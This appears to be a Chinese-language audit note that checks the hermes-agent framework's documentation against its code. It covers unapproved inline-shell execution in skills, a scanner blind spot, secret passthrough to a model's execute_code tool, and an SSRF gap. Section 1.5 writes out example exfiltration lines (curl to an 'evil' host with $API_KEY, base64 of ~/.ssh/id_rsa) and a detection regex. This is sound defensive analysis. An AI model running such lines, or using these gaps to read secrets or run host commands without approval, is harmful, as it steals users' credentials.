# r9a 底稿 · 90 —— 文档-代码定案(主线独立取证)

> 研究对象基线:`/home/user/hermes-agent` @ `863e31318553cda8ad61df681d08175364d4164b`(只读)。
> 溯源约定:凡对代码行为的断言,**锚点单独成行、置于代码块/引用块之前**,格式 `路径:行号 @ 863e313`。
>
> 记号(CLAUDE.md):▲ = 文档所述与代码**矛盾**;◇ = 代码有、文档无;■ = 代码缺陷;
> **◎ = 文档成立但显著保守**。字面为真就不是 ▲。
>
> **本文是主线自己取证的部分**,不是子代理产出的转录。子代理的定案候选另见各自底稿,
> 经主线复核后并入本文 §5。

---

## 1. 一条 ◇:SKILL.md 的内联 shell 是一条**不经审批**的主机执行路径

### 1.1 现象

`SKILL.md` 里写 ``!`cmd` `` 这种记号,加载该 skill 时 `cmd` 会**在宿主机上直接执行**,
输出被替换进注入模型的正文。这条路径**不经过** `tools/approval.py` 的任何闸门。

`agent/skill_commands.py:290 @ 863e313`

```
    if skills_cfg.get("inline_shell", False):
        timeout = int(skills_cfg.get("inline_shell_timeout", 10) or 10)
        content = _expand_inline_shell(content, skill_dir, timeout)
```

展开逻辑只做正则替换,替换函数直接调 `run_inline_shell`:

`agent/skill_preprocessing.py:119 @ 863e313`

```
    def _replace(match: re.Match) -> str:
        cmd = match.group(1).strip()
        if not cmd:
            return ""
        return run_inline_shell(cmd, skill_dir, timeout)
```

而 `run_inline_shell` 的全部实现就是一次 `subprocess.run(["bash", "-c", command])`:

`agent/skill_preprocessing.py:73 @ 863e313`

```
        completed = subprocess.run(
            ["bash", "-c", command],
            cwd=str(cwd) if cwd else None,
            capture_output=True,
            text=True, encoding='utf-8', errors='replace',
            timeout=max(1, int(timeout)),
            check=False,
            stdin=subprocess.DEVNULL,
            **_popen_kwargs,
        )
```

### 1.2 为什么这**不是** ▲ —— 文档自己写明了

按 CLAUDE.md,判定一条文档断言时必须把**整句/整段**一并判定。这一段文档是这么写的:

`website/docs/developer-guide/creating-skills.md:312 @ 863e313`

> This is **off by default** — any snippet in a SKILL.md runs on the host without approval, so only enable it for skill sources you trust:

**这句话逐字为真**,而且它主动披露了「without approval」。默认关闭也逐字为真——
配置读取用的是 `skills_cfg.get("inline_shell", False)`,默认 `False`(见 §1.1 第一个代码块)。

同段的另外两个数字也成立:

`website/docs/developer-guide/creating-skills.md:321 @ 863e313`

> Snippets run with the skill directory as their working directory, and output is capped at 4000 characters. Failures (timeouts, non-zero exits) show up as a short `[inline-shell error: ...]` marker instead of breaking the whole skill.

- 「working directory = skill 目录」:`cwd=str(cwd) if cwd else None`,调用方传的是 `skill_dir`(§1.1)
- 「capped at 4000 characters」:

`agent/skill_preprocessing.py:21 @ 863e313`

```
# Cap inline-shell output so a runaway command can't blow out the context.
_INLINE_SHELL_MAX_OUTPUT = 4000
```

- 「短标记而不是整个 skill 崩掉」:

`agent/skill_preprocessing.py:83 @ 863e313`

```
    except subprocess.TimeoutExpired:
        return f"[inline-shell timeout after {timeout}s: {command}]"
    except FileNotFoundError:
        return "[inline-shell error: bash not found]"
```

所以这一条记 **◇ 的变体**:不是「代码有、文档无」,而是**文档有、但它记的是一件值得单独拎出来的事**。
按记号定义严格说,它既不是 ▲(字面为真)也不是 ◇(文档写了)。**本文把它记为一条独立观察**,
不计进 ▲/◇ 的跨轮计数——理由与 CLAUDE.md 引入 ◎ 时的理由同源:
**把字面为真的东西计进 ▲ 会让跨轮的「地图腐烂程度」指标不可比。**

### 1.3 但它仍然重要:这是 R8D「守卫存在,但有一条路不问它」的同一形状

R8D 全轮反复撞见的分析主线是**守卫存在,但有一条路不问它**。内联 shell 正是这个形状,
差别在于**这一条是作者知情并写进文档的**。

**负结论与搜索面**(CLAUDE.md:全称否定必须写出搜索面):

断言 —— *`agent/skill_preprocessing.py` 与 `agent/skill_commands.py` 都不触达审批体系*。

搜索面:
1. 对全仓非测试 `.py` 搜三种 import 形式 `from tools.approval import` / `from tools import approval` /
   `import tools.approval`,**命中 32 个文件**,两个 skill 文件都不在其中;
2. 对 `agent/skill_preprocessing.py` 全文搜 `approv|permission|guard|confirm|sandbox`(忽略大小写),
   命中 4 处,**全部**在同一段注释里,讲的是 `tests/conftest.py` 的 live-system guard 如何影响
   超时清理,与审批无关;
3. 该文件的全部 import 只有 `logging` / `re` / `subprocess` / `pathlib.Path` /
   `hermes_cli._subprocess_compat`,没有任何审批相关模块。

```verify
cd /home/user/hermes-agent && grep -rln "from tools.approval import\|from tools import approval\|import tools.approval" --include="*.py" . | grep -v "^./tests" | wc -l
# → 32
cd /home/user/hermes-agent && grep -rln "from tools.approval import\|from tools import approval\|import tools.approval" --include="*.py" . | grep -v "^./tests" | grep -c "skill_"
# → 0  (退出码 1,grep -c 无命中时如此;即两个 skill 文件都不在这 32 个里)
cd /home/user/hermes-agent && grep -n "^import \|^from " agent/skill_preprocessing.py
# → 只有 logging / re / subprocess / pathlib / hermes_cli._subprocess_compat
```

排除项:测试目录 `tests/**` 被排除,因为测试不是生产调用路径;
本搜索面**不覆盖**运行期动态 import(`importlib`、`__import__` 字符串拼接),
所以严格说它证明的是「静态 import 层面不触达审批」,不是「运行期绝无可能」。

**对照组**:`tools/delegate_tool.py` **在**那 32 个文件里——即委派工具是走审批的。
这让内联 shell 这条路显得更特别:同样是「让别的东西替我执行」,一条问闸门,一条不问。

### 1.4 取舍判断

作者的取舍是清楚的,而且我认为是合理的:内联 shell 的**命令来自 SKILL.md 文件本身**,
不来自模型输出。审批闸门防的是「模型被诱导去跑危险命令」,而 SKILL.md 是用户安装到本地的文件——
按同一逻辑,用户装的 shell 脚本也不该每次执行都弹审批。

**真正的风险面因此不在审批,在供应链**:如果 skill 可以从远端 hub 同步下来(`tools/skills_sync*.py`),
且用户开了 `inline_shell`,那么**远端内容 → 宿主机执行**就成立了。文档的
「only enable it for skill sources you trust」正是在说这件事。
这条链的另一半(同步侧到底怎么校验来源)由 `notes/r9a-raw-skills-sync.md` 取证。

### 1.5 补充(主线复核子代理条目后加写):安全扫描器不认识这个记号

`notes/r9a-raw-skills-hub.md` 报了一条 ◇:`tools/skills_guard.py` 的威胁模式表里
没有任何一条匹配内联 shell 的 ``!`…` `` 记号。主线独立复核**成立**:

`tools/skills_guard.py:101 @ 863e313`

```
THREAT_PATTERNS = [
    # ── Exfiltration: shell commands leaking secrets ──
    (r'curl\s+[^\n]*\$\{?\w*(KEY|TOKEN|SECRET|PASSWORD|CREDENTIAL|API)',
     "env_exfil_curl", "critical", "exfiltration",
```

```verify
cd /home/user/hermes-agent && grep -c '!`\|inline_shell\|inline-shell' tools/skills_guard.py
# → 0     (表里共 123 条模式,无一涉及这个记号)
cd /home/user/hermes-agent && awk 'NR>=101,/^\]/' tools/skills_guard.py | grep -c '^    ('
# → 123
```

**但要把这条的杀伤力说准,不能顺着子代理的表述放大。** 这 123 条模式扫的是
SKILL.md 的**正文文本**,所以一条 ``!`curl http://evil/?k=$API_KEY` `` 仍会被
上面那条 `env_exfil_curl` 命中——命中的是**括号里的内容**,不是记号本身。

精确的结论是:**扫描器无法区分「文档里写了一条 curl 命令」与「这条 curl 命令会被执行」**。
后果有二:

1. 任何**正文不匹配这 123 条模式**的命令(`` !`whoami` ``、`` !`cat ~/.ssh/id_rsa | base64` ``
   ——后者是否命中取决于模式细节)执行时不会被标记;
2. 反过来,一份**只是把危险命令写进文档当例子**的 skill 会被误报为 critical。

两个方向的错都源于同一件事:**扫描器看的是文本,而执行与否由一个它不认识的记号决定。**

这与 §1.2 的判定不冲突——文档如实披露了「without approval」;
但披露的是**审批**这一层,而**扫描**这一层的盲区没有任何文档提到。
所以这一条按记号定义记 **◇**(代码有、文档无):
`skills_guard` 的扫描面与 `inline_shell` 的执行面之间存在文档从未交代的错位。

---

## 2. 一条 ▲:「Hermes never exposes the raw secret value to the model」被同一节的下一段推翻

### 2.1 两句话,同一个 `## Secure Setup on Load` 标题下

`website/docs/developer-guide/creating-skills.md:178 @ 863e313`

> The user can skip setup and keep loading the skill. Hermes never exposes the raw secret value to the model. Gateway and messaging sessions show local setup guidance instead of collecting secrets in-band.

隔一个空行,同一节的 `:::tip` 块:

`website/docs/developer-guide/creating-skills.md:181 @ 863e313`

> When your skill is loaded, any declared `required_environment_variables` that are set are **automatically passed through** to `execute_code` and `terminal` sandboxes — including remote backends like Docker and Modal. Your skill's scripts can access `$TENOR_API_KEY` (or `os.environ["TENOR_API_KEY"]` in Python) without the user needing to configure anything extra. See [Environment Variable Passthrough](/user-guide/security#environment-variable-passthrough) for details.

**`execute_code` 是模型驱动的工具,它的输出回到模型上下文。** 所以第二句描述的那条路
——模型写 `print(os.environ["TENOR_API_KEY"])` → 值进沙箱子进程 → 结果回到模型——
就是「把原始密钥值暴露给模型」。第一句的 **never** 因此不成立。

按 CLAUDE.md「判定一条文档断言时必须把整句/整段一并判定,并确认它归哪个标题管」:
这两段**同属 `## Secure Setup on Load`**,中间没有别的标题,所以这不是把两个无关小节
硬拼在一起——是同一节内部自相矛盾。

### 2.2 代码站在第二句这边

透传变量在**密钥子串扫描之前**就被放行,所以它绕过的正是那道通用清洗:

`tools/code_execution_tool.py:252 @ 863e313`

```
    _dropped_hermes = []
    for k, v in source_env.items():
        if is_passthrough(k):
            resolved = resolve_passthrough_value(k, v)
            if resolved is not None:
                scrubbed[k] = resolved
            continue
        if any(s in k.upper() for s in _SECRET_SUBSTRINGS):
            continue
```

`scrubbed` 就是交给子进程的环境。`is_passthrough(k)` 为真时 `continue`,
**根本走不到** `_SECRET_SUBSTRINGS` 那一行。

### 2.3 作者知道这条路 —— 但堵的是另一半

`tools/env_passthrough.py:54 @ 863e313`

```
    Skill-declared ``required_environment_variables`` frontmatter must
    not be able to override this list — that was the bypass in
    GHSA-rhgp-j443-p4rf where a malicious skill registered
    ``ANTHROPIC_TOKEN`` / ``OPENAI_API_KEY`` as passthrough and received
    the credential in the ``execute_code`` child process, defeating the
    sandbox's scrubbing guarantee.

    Non-Hermes API keys (TENOR_API_KEY, NOTION_TOKEN, etc.) are NOT
    in the blocklist and remain legitimately registerable — skills that
    wrap third-party APIs still work.
```

这段 docstring 把整件事说得很清楚,而且**这正是判定的关键**:

- 曾经有过真实漏洞(GHSA-rhgp-j443-p4rf):恶意 skill 把 `ANTHROPIC_TOKEN` 注册成透传,
  在 `execute_code` 子进程里拿到了它;
- 修法是加一张 **Hermes 自家 provider 凭据的黑名单**,并且 fail closed(黑名单导不进来就一律拒绝);
- **第三方密钥被有意留在外面**——`TENOR_API_KEY` / `NOTION_TOKEN` 这类「仍然可以合法注册」,
  否则包装第三方 API 的 skill 就不能用了。

所以代码的真实语义是:**「不把 *Hermes 自家的* 原始凭据暴露给模型」**,
而文档写的是 **「never exposes *the raw secret value* to the model」**。
差的就是那个限定词,而这个限定词恰恰是整条防线的全部边界。

### 2.4 定案

**▲**(文档所述与代码矛盾)。判据可复现:

- 输入:一个声明了 `required_environment_variables: [{name: TENOR_API_KEY}]` 的 skill,
  用户已配置该密钥,skill 被 `skill_view` 加载;
- 现象:模型调用 `execute_code` 执行 `import os; print(os.environ["TENOR_API_KEY"])`,
  工具结果把原始密钥值带回模型上下文。
- 与文档第 178 行的 never 直接冲突;与第 181 行的 tip 一致。

**这条 ▲ 记在文档头上,不记 ■。** 代码的行为是**有意设计**的(有 GHSA 溯源、有黑名单、
有 fail-closed、有「第三方密钥仍可注册」的显式说明),取舍成立;
出问题的是文档那句没有限定词的 never。

**修法建议**(不属于本项目职责,仅作记录):把 178 行改成
"Hermes never exposes *Hermes-managed provider credentials* to the model"
即可与代码一致,且不削弱那条 tip 的实用性。

### 2.5 与 §1 的关系

§1(内联 shell)与本条是**同一个主题的两面**:

| | 谁能碰到密钥/主机 | 文档态度 | 判定 |
|---|---|---|---|
| §1 内联 shell | SKILL.md 作者(不经审批执行主机命令) | **主动披露**「without approval」 | 不记 ▲ |
| §2 环境变量透传 | 模型(经 `execute_code` 读到第三方密钥) | 一句 never + 一句 tip,**自相矛盾** | **▲** |

两者的共同结构是:**skill 这条扩展面同时是一条能力面和一条信任面**,
而信任边界的说明质量在同一份文档里并不一致。

---

## 3. 一条 ▲:`AGENTS.md` 把 `max_iterations` 的默认值写成 500,实际是 90

### 3.1 文档侧

这一段挂在哪个标题下,是判定的前提。它归 `AGENTS.md:314` 的
`## AIAgent Class (run_agent.py)` 管——**文档自己点名了它在描述 `run_agent.py`**。

`AGENTS.md:328 @ 863e313`

>     max_iterations: int = 500,         # tool-calling iterations (shared with subagents)

整段是以 `def __init__(` 开头的**函数签名清单**(322–332 行),读者会当作权威签名读。

### 3.2 代码侧

`run_agent.py:412 @ 863e313`

```
class AIAgent:
```

其 `__init__` 从 435 行开始,第 446 行是那个参数:

`run_agent.py:446 @ 863e313`

```
        max_iterations: int = 90,  # Default tool-calling iterations (shared with subagents)
```

同一个默认值在 agent 初始化侧也是 90:

`agent/agent_init.py:470 @ 863e313`

```
    max_iterations: int = 90,  # Default tool-calling iterations (shared with subagents)
```

### 3.3 搜索面

断言 —— *全仓没有任何一处把 `max_iterations` 的默认值定为 500*。

搜索面:全仓 `--include="*.py"`、排除 `./tests`,搜 `max_iterations` 且带默认值形态
(`int = ` / `= 500` / `= 90`)。命中 5 处,全部列出:

```verify
cd /home/user/hermes-agent && grep -rn "max_iterations" --include="*.py" . | grep -v "^./tests" | grep -E "= *500|= *90|int = "
# → agent/agent_init.py:470   max_iterations: int = 90
#   mini_swe_runner.py:171    max_iterations: int = 15
#   mini_swe_runner.py:640    max_iterations: int = 15
#   run_agent.py:446          max_iterations: int = 90
#   batch_runner.py:540       max_iterations: int = 10
```

排除项:测试目录被排除(测试里的构造参数不是产品默认值);
本搜索面不覆盖 YAML/JSON 配置里的默认值,但文档那一行描述的是 **Python 函数签名**,
所以配置侧不在争议范围内。**没有任何一处是 500。**

### 3.4 定案

**▲**。判据可复现:读 `AGENTS.md` 的 AIAgent 签名 → 以为不传 `max_iterations` 时上限是 500 →
实际构造出来的 agent 上限是 90,**差 5.6 倍**。

**注释文字几乎逐字相同**(文档 `# tool-calling iterations (shared with subagents)`
vs 代码 `# Default tool-calling iterations (shared with subagents)`),说明文档当年是从代码抄的,
**抄完之后数字漂了而注释没漂**——这正是「作者自绘地图」最典型的腐烂方式:
形状还对,数值已经不对,而形状对会让读者更信任它。

**同段其余默认值我逐个核过,全部正确**——这才是这条 ▲ 真正的杀伤力所在。
文档 322–339 行列出的 15 个带默认值的参数里,除 `max_iterations` 外的 14 个与代码完全一致:

| 文档参数 | 文档默认值 | 代码位置(`run_agent.py`) | 一致? |
|---|---|---|---|
| `base_url` / `api_key` / `provider` / `api_mode` | `None` | 437–440 | ✓ |
| `model` | `""` | 445 | ✓ |
| **`max_iterations`** | **`500`** | **446 是 `90`** | **✗** |
| `enabled_toolsets` / `disabled_toolsets` | `None` | 448–449 | ✓(注解 `list` vs `List[str]`,默认值同) |
| `save_trajectories` / `quiet_mode` | `False` | 450 / 452 | ✓ |
| `platform` | `None` | 487 | ✓ |
| `session_id` | `None` | 464 | ✓ |
| `skip_context_files` / `skip_memory` | `False` | 496 / 498 | ✓ |
| `credential_pool` | `None` | 503 | ✓ |

**14 对 1。** 一个读者核对前三个参数发现都对,就不会再核第六个——
**高准确率的文档让其中唯一的错误更难被发现,而不是更容易。**
这也是本项目「文档与代码冲突时以代码为准」这条规矩存在的理由:
它不是因为文档普遍不可信,而是因为**可信度无法逐条继承**。

**为什么这条落在 R9A 而不是 R2**:`max_iterations` 的注释自己写着 **shared with subagents**,
它是委派簇的迭代预算上限。R2 读回合主循环时这一行在射程内但未被判定;本轮因为读委派而撞上。

---

## 4. 一份**没有腐烂**的文档:`subagent-lifecycle-api.md`

本项目的 ▲ 计数衡量的是「作者自绘地图的腐烂程度」。为了让这个指标有意义,
**核出「没腐烂」的样本同样要记**——否则读者只看得到坏消息,无法判断腐烂是普遍还是局部。

`website/docs/developer-guide/subagent-lifecycle-api.md`(61 行)对
`agent/subagent_lifecycle.py` 做了一批**很具体、很可证伪**的断言。主线逐条核对,**全部成立**:

| 文档断言 | 代码 | 判定 |
|---|---|---|
| 9 个稳定状态 `PENDING`/`STARTING`/`RUNNING`/`SUCCEEDED`/`FAILED`/`INTERRUPTED`/`CANCEL_REQUESTED`/`CANCELLED`/`UNKNOWN` | `agent/subagent_lifecycle.py` 39–47 | 成立,不多不少 |
| 终态结果 bounded to 32k characters | 同文件 30 | 成立 |
| 保留期 one hour | 同文件 31 | 成立 |
| 越界/伪造句柄返回 `UNKNOWN`/`UNKNOWN_HANDLE` | 同文件 266、277、329 | 成立 |
| 进程重启后 `reconnect` 返回 `RECONNECT_UNAVAILABLE` 且不重启子代理 | 同文件 342 | 成立 |
| 在 agent 回合之外启动会 fail closed | 同文件 202 | 成立 |

状态枚举:

`agent/subagent_lifecycle.py:39 @ 863e313`

```
    PENDING = "PENDING"
    STARTING = "STARTING"
    RUNNING = "RUNNING"
    SUCCEEDED = "SUCCEEDED"
    FAILED = "FAILED"
    INTERRUPTED = "INTERRUPTED"
    CANCEL_REQUESTED = "CANCEL_REQUESTED"
    CANCELLED = "CANCELLED"
    UNKNOWN = "UNKNOWN"
```

各项上限与保留期:

`agent/subagent_lifecycle.py:27 @ 863e313`

```
_MAX_GOAL_CHARS = 16_000
_MAX_CONTEXT_CHARS = 32_000
_MAX_METADATA_BYTES = 8_192
_MAX_RESULT_CHARS = 32_000
_TERMINAL_RETENTION_SECONDS = 3_600
```

**一处口径提示(不记 ▲)**:文档正文只说了 goal/context/metadata「sizes are capped」而没给数,
只对**结果**给了 32k。代码里 goal 的上限是 16,000 而 context 是 32,000——
**两者不同**。文档没写错(它没给数),但读者容易把「32k」当成对所有输入都成立。
这属于**表述精度**问题,不是矛盾,故不计 ▲。

**为什么这一份没烂,值得想一下**:它是 `developer-guide/` 下面向插件作者的 **API 契约文档**,
文件里写的是 `PUBLIC_CONTRACT_VERSION = 1`。有版本号的契约面比散文式的架构介绍更难腐烂——
这与 R7B/R7C 撞见的那些烂掉的 `gateway-internals.md` 式文档形成对照。

---

## 5. 子代理条目的主线复核

**制度要求主线复核子代理条目。** 本节记录主线**独立重跑/重读**过的条目——
每条都写明「子代理怎么说 / 主线核到什么 / 判定」。**未经主线复核的条目不进本节**,
它们留在各自底稿里,报告引用时会标注来源。

复核的规矩是:**不为背书而复核**。下面有两条的结论与子代理的表述**不完全一致**,
主线以自己核到的为准并写明差异。

### 5.1 通过(与子代理一致)

| # | 子代理断言 | 主线独立核对 | 判定 |
|---|---|---|---|
| a | `agent/insights.py` **不属于**学习闭环,是只读 `state.db` 的用量报表 | 该文件对 `curator\|skills/\|.usage.json\|hermes_home` **零命中**;顶层 import 只有 `json` / `sqlite3` / `time` / `collections` / `datetime` / `typing` / `agent.usage_pricing` | **通过**,且影响成品章分簇 |
| b | `agent/curator.py:1644` 是**死分支** | 判断的字面量 `"No agent-created skills"` 全仓仅出现在**判断处本身**这一行;生产方 `_render_candidate_list()`(`:1473`)返回的是 `"No curator-managed skills to review."`(`:1477`) | **通过** |
| c | `last_run_at` 写在 daemon 线程启动**之前** | 落盘在 `:1579`,`threading.Thread(..., daemon=True, name="curator-review")` 在 `:1750` | **通过**(1579 < 1750) |
| d | R8D 的两个锚点各差一行 | `_SECRET_SOURCES[name] = applied.source` 实际在 **`:666`** 与 **`:234`**,R8D 记的是 `:667` / `:235` | **通过**,见 §5.3 的成因分析 |
| e | `iron_proxy` 是第三方 Go 二进制的包装层 | 模块 docstring 第 1 行 `iron-proxy (\`ironsh/iron-proxy\`) integration`,第 11 行 `TLS-intercepting egress firewall (Apache-2.0, Go binary, by` | **通过** |
| f | 验证门只认两个工具名 | `agent/tool_result_classification.py:9` 是 `frozenset({"write_file", "patch"})`,恰好两个 | **通过** |
| g | `skills_guard` 的威胁模式表不认内联 shell 记号 | 实跑 `grep -c` = 0,模式条数 = 123 | **通过但收窄**,见 §1.5 |
| h | `batch_runner.py --list_distributions` **必崩** | 静态:`:51` import 了函数 `list_distributions`,`main`(`:1156`)的形参 `:1168` 同名遮蔽它,`:1237` 又去调它。动态:主线实跑得 `TypeError: 'bool' object is not callable` | **通过**,见 §5.4 |

### 5.2 收窄或更正(与子代理表述不同)

**(一)SSRF 守卫绕过面比子代理描述的更宽,但安全含义比它说的更窄。**

子代理称 `BrowseShSource.fetch` 绕过 `_guarded_http_get`,「而 `UrlSource`/`WellKnown`/
`ClawHub._fetch_text` 都走」。主线重数:`tools/skills_hub.py` 里守卫函数被用 **4 次**
(`:1380` / `:1411` / `:1548` / `:1555`),裸 `httpx.get` 有 **8 处**——
不止 `BrowseShSource` 一处不走。

但**安全含义的轴不是「走不走守卫」,是「URL 从哪来」**。主线逐个核 URL 来源:

| 裸调用 | 所属函数 | URL 来源 |
|---|---|---|
| `:817` / `:830` | `_get_repo_tree` | 硬编码 `https://api.github.com/repos/{repo}` |
| `:894` | `_github_get` | 同上族 |
| `:1666` | `search` | 类常量 `self.SEARCH_URL` |
| `:1743` / `:1767` | `_sitemap_catalog` | 类常量 `self.SITEMAP_INDEX_URL` |
| `:1817` | `_featured_skills` | 类常量 `self.BASE_URL` |
| **`:3205`** | **`BrowseShSource.fetch`** | **远端 JSON 字段** |

`tools/skills_hub.py:3197 @ 863e313`

```
        # Resolve the actual SKILL.md content URL via the per-skill detail
        # endpoint, which returns a ``skillMdUrl`` (CDN blob). The catalog's
        # ``sourceUrl`` is a GitHub HTML link whose underlying repo is not
        # reliably public, so we don't use it for content.
        md_url = self._resolve_skill_md_url(slug, item)
        if not md_url:
            return None
        try:
            resp = httpx.get(md_url, timeout=20, follow_redirects=True)
```

**所以 `:3205` 之所以是这 8 处里唯一要紧的那一处,不是因为别处都走了守卫**
(它们也没走),**而是因为只有它的 URL 来自远端可控数据**,并且还带 `follow_redirects=True`。
子代理的结论对,给出的理由不完全对——**照它的理由去修会修错地方**
(给 GitHub 那几处加守卫没有意义,给 `:3205` 加才有)。

**(二)`sync.base_url` 那条 ■ 与 H-R8D-e 是同一形状的**另一个实例**,主线独立坐实。**

`tools/skills_sync_client.py:318 @ 863e313`

```
    env = os.getenv("HERMES_SYNC_BASE_URL")
    if env and env.strip():
        return env.strip().rstrip("/")
```

整个 `resolve_sync_base_url()`(`:307`–`:334`)对取到的值**只做 `strip()` 与 `rstrip("/")`**,
没有 scheme 校验、没有主机白名单;而这个 base 上挂的是 Nous JWT bearer。
这与 H-R8D-e 描述的 `hermes_cli/models.py` 那处**是同一类问题的不同实例**——
说明 R8D 判断「还有多少带凭据的可控 URL 未普查」是对的,而且答案不止在 `urlopen` 那一族里
(这一处走的是 `requests`,`urlopen` 的普查**抓不到它**)。这一点已作为交叉校验
交给做 H-R8D-e 普查的那一路,见报告移交节。

**(三)`AGENTS.md` 的 toolset 清单:子代理多点了一个,主线核出准确集合。**

子代理报 ▲-3 称 `AGENTS.md:971-974` 列的 `moa` 不在 `TOOLSETS` 里,并顺带说
「`messaging`/`rl`/`file` 也没有」。主线实测:**`file` 是有的**,子代理这一项报错了。

`AGENTS.md:971 @ 863e313`

> Current toolset keys: `browser`, `clarify`, `code_execution`, `cronjob`,

准确集合:文档列 **30** 个键,`TOOLSETS` 实有 **58** 个,
其中**文档有而代码无的恰好 3 个**——`messaging`、`moa`、`rl`。

```verify
cd /home/user/hermes-agent && /home/user/hermes-venv/bin/python -c '
import sys; sys.path.insert(0, "/home/user/hermes-agent")
from toolsets import TOOLSETS
doc = "browser clarify code_execution cronjob debugging delegation discord discord_admin feishu_doc feishu_drive file homeassistant image_gen kanban memory messaging moa rl safe search session_search skills spotify terminal todo tts video vision web yuanbao".split()
ks = set(TOOLSETS)
print("文档列出:", len(doc)); print("TOOLSETS 实有:", len(ks))
print("文档有而代码无:", [d for d in doc if d not in ks])
print("核对 file:", "file" in ks)
'
# → 文档列出: 30 / TOOLSETS 实有: 58
#   文档有而代码无: ['messaging', 'moa', 'rl']
#   核对 file: True
```

**▲ 成立,但范围是三个不是四个。** 这条被单独拎出来,是因为它示范了复核的必要性:
子代理的结论方向对、锚点对,**枚举多点了一个**。若不复核就照抄,
本轮会向后续轮传一个「`file` 不是 toolset」的错误事实——
而 `file` 恰恰是 `subagent-lifecycle-api.md` 代码示例里用来演示
`allowed_toolsets=("file",)` 的那个键(见 §4 引的那份文档)。

*(另注:文档列 30 而代码有 58,即文档还**漏掉 28 个**。「Current toolset keys: …」
以句号收尾、读起来像完整枚举。本轮不把这一半也判成 ▲——需要先确认那 28 个里
有多少是对外可用的键、有多少是内部/别名,而这属于 R9D 的工具面射程。已列为移交。)*

### 5.3 一条方法学收获:为什么 R8D 那两个锚点会漂

R8D 的 `:667` / `:235` 各差一行,而同一份底稿里**带代码块的锚点全部正确**。成因是结构性的:

那两个行号写在 R8C 底稿的**移交表格**里。`scripts/verify_citations.py` 的配对规则是
「锚点 → **紧跟的**代码块/引用块」,而**表格行后面跟的是下一个表格行**,不是块。
于是这两个锚点从写下的那天起就一直记 UNCHECKED,**从来没有被任何一次校验碰过**。

这与 CLAUDE.md 里 R8C 记的那条「单文件 UNCHECKED ≥90% 提示」是同一个洞的两个位置:
**校验器只能校验它配得上对的东西,而移交表格这种形态天然配不上对。**
本轮的处理是:**移交项表格里的行号,主线一律重新核过再往下传**——
这次核出两处各差一行,若不核就会第三轮继续传下去。

*(不改 `scripts/`:本轮有子代理共享资源纪律,脚本在运行期不动。
是否给校验器加「表格行内锚点」的处理,作为建议移交,不在本轮改。)*

### 5.4 主线实跑复现的一条 ■:`--list_distributions` 必崩

这一条值得单列,因为它是本轮**唯一一条主线自己动手跑出来、而不是读出来**的缺陷。

`batch_runner.py:51 @ 863e313`

```
    list_distributions, 
```

模块顶部把 `list_distributions` 作为**函数**导入。但 `main` 的形参里有一个同名的 bool:

`batch_runner.py:1168 @ 863e313`

```
    list_distributions: bool = False,
```

于是在 `main`(定义于 `:1156`)的作用域内,这个名字指向的是形参,不是函数。
而分支体里又把它当函数调用:

`batch_runner.py:1231 @ 863e313`

```
    if list_distributions:
```

`batch_runner.py:1237 @ 863e313`

```
        all_dists = list_distributions()
```

`:1231` 为真的**唯一**方式就是把这个标志传成 `True`,而一旦为真,`:1237` 就必然
拿一个 `True` 去调用。**这条命令没有任何一次能成功。**

主线动态复现(在 `/tmp` 下跑,`HERMES_HOME` 指向临时目录,不碰基线;跑完已删除):

```verify
cd /tmp && HERMES_HOME=/tmp/r9a-probe-home /home/user/hermes-venv/bin/python -c "
import sys; sys.path.insert(0,'/home/user/hermes-agent')
import batch_runner
try:
    batch_runner.main(list_distributions=True)
except TypeError as e:
    print('TypeError →', e)
"
# → 📊 Available Toolset Distributions
#   ======================================================================
#   TypeError → 'bool' object is not callable
# (先打出表头再崩,所以从输出看像"跑了一半",不像"根本没实现")
```

复现后 `git -C /home/user/hermes-agent status --porcelain` 仍为 0 行,基线未受影响。

**为什么这条能活下来**:子代理报它「被文档、docstring、测试文案三处主推,且无任何测试跑过」。
主线不重复它的搜索面,只补一句自己观察到的:**它先打印表头再崩**——
一个只看前两行输出的人会以为它在工作。这与本轮 §1.5 的形状是同一类:
**部分正确的输出比完全没有输出更能掩盖故障。**
